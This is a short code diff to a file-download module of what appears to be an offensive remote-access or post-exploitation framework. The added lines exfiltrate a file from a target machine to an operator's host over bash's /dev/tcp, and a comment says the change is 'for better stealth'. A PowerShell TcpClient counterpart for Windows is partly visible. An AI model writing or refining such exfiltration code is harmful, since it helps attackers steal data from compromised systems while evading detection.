@@ -71,10 +71,9 @@ class DownloadModule(KoiModule):
         )
 
         if os_type == "linux":
-            self.exec(
-                f"cat {quoted} > /dev/tcp/{local_ip}/{port}",
-                timeout=TIMEOUTS["download"],
-            )
+            # Use bash native while read instead of cat for better stealth
+            cmd = f"while IFS= read -r l; do echo \"$l\"; done < {quoted} > /dev/tcp/{local_ip}/{port}"
+            self.exec(cmd, timeout=TIMEOUTS["download"])
         else:
             ps_cmd = (
                 f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
